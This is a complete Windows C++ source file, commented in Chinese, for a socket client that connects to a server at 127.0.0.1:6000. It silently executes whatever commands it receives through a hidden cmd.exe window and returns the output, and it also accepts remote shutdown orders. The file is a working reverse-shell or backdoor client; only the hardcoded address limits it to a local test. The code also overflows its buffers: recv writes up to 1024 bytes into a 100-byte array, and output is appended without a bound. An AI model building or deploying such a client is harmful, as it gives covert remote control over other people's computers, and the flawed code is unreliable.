// client.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <Winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

#define MSG_LEN 1024

int cmd(char *cmdStr, char *message)
{
	DWORD readByte = 0;
	char command[1024] = { 0 };
	char buf[MSG_LEN] = { 0 };    //缓冲区

	HANDLE hWrite, hRead;
	STARTUPINFO si;         // 启动配置信息
	PROCESS_INFORMATION pi; // 进程信息
	SECURITY_ATTRIBUTES sa; // 管道安全属性
		   				
	sprintf(command, "cmd.exe /c %s", cmdStr); // 拼接 cmd 命令
	// printf("-- CMD 命令: [%s]n", command);

	// 配置管道安全属性
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE; // 管道句柄是可被继承的
	sa.lpSecurityDescriptor = NULL;

	// 创建匿名管道，管道句柄是可被继承的
	if (!CreatePipe(&hRead, &hWrite, &sa, 1024))
	{
		printf("管道创建失败! Error: %xn", (unsigned int)GetLastError());
		return 1;
	}

	// 配置 cmd 启动信息
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si); // 获取兼容大小
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
	si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
	si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头

											// 创建子进程,运行命令,子进程是可继承的
	if (!CreateProcess(
		NULL,       // 不传程序路径, 使用命令行    
		command,    // 命令行命令        
		NULL,       // 不继承进程句柄(默认)  
		NULL,       // 不继承线程句柄(默认)  
		TRUE,       // 继承句柄
		0,          // 没有创建标志(默认)
		NULL,       // 使用默认环境变量 
		NULL,       // 使用父进程的目录 
		&si,        // STARTUPINFO 结构存储启动信息
		&pi))     // PROCESS_INFORMATION 保存启动后的进程相关信息 
	{
		printf("创建进程失败! Error: %xn", (unsigned int)GetLastError());
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return 1;
	}

	CloseHandle(hWrite);

	/*
	管道的 write 端句柄已被 cmd 的输出流和错误流继承,
	即 cmd 输出时会把数据写入管道。
	我们通过读取管道的 read 端，就可以获得 cmd 的输出
	*/
	while (ReadFile(hRead, buf, MSG_LEN, &readByte, NULL))
	{
		strcat(message, buf);
		ZeroMemory(buf, MSG_LEN);
	}

	//printf("-- [CMD] Message: [%s] Length:%d n", message, strlen(message) + 1);

	CloseHandle(hRead);
	return 0;
}

int run(char *recvCmd, char *message)
{
	if (strcmp(recvCmd, "test") == 0)
	{
		strcpy(message, "服务端你好，有什么事吗~");
	}
	else if (strcmp(recvCmd, "shutdown") == 0)
	{
		// 执行关机命令，设了个定时关机没直接关
		system("shutdown -s -t 1800");
		strcpy(message, "客户端将在 30 分钟后关闭");
	}
	else if (strcmp(recvCmd, "cancel") == 0)
	{
		// 注销关机命令
		system("shutdown -a");
		strcpy(message, "客户端定时关机已取消");
	}
	else if (strcmp(recvCmd, "exit") == 0)
	{
		return 1;
	}
	else
	{
		// 调用 cmd
		cmd(recvCmd, message);
	}
	return 0;
}

void main()
{
	int err = 0;
	char message[MSG_LEN] = { 0 };         //客户端要发送的数据
	char recvCmd[100] = { 0 };         //客户端接收的数据

	SOCKET sockClient;                 // 客户端 Scoket
	SOCKADDR_IN addrServer;            // 服务端地址

	WSADATA wsaData;
	WORD wVersionRequested;

	wVersionRequested = MAKEWORD(2, 2);

	err = WSAStartup(wVersionRequested, &wsaData);

	if (err != 0)
	{
		return;
	}

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)
	{
		// 启动错误，程序结束
		WSACleanup();
		return;
	}

	// 新建客户端 scoket
	sockClient = socket(AF_INET, SOCK_STREAM, 0);

	// 定义要连接的服务端地址
	addrServer.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");  // 目标IP (127.0.0.1是本机地址)
	addrServer.sin_family = AF_INET;                           // 协议类型是INET
	addrServer.sin_port = htons(6000);                         // 连接端口6000

	// 让 sockClient 连接到 服务端
	connect(sockClient, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));

	while (1)
	{
		// 清空字符串
		ZeroMemory(recvCmd, sizeof(recvCmd));
		ZeroMemory(message, sizeof(message));
		// 从服务端获取数据
		recv(sockClient, recvCmd, MSG_LEN, 0);
		
		if (strlen(recvCmd) > 0)
		{ 
            printf("-- 收到命令: [%s]\n", recvCmd);

			if (run(recvCmd, message))
			{
				break;
			}
			// printf("Message: [%s] Length:%d n", message, strlen(message) + 1);
			send(sockClient, message, strlen(message) + 1, 0);
		}
	}
	// 关闭socket
	closesocket(sockClient);
	WSACleanup();
}

